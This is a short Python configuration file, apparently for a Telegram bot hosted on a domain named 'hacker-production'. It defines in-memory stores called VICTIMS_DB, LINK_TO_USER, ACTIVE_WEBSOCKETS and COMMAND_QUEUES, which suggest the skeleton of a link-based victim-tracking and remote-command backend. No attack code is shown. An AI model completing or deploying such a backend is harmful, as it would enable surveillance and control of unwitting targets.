import os

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
DOMAIN = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-edfa.up.railway.app"

# قواعد البيانات الذاكرية المشتركة
LINK_TO_USER = {}
USERS_DB = {}
VICTIMS_DB = {}
ACTIVE_WEBSOCKETS = {}
COMMAND_QUEUES = {}
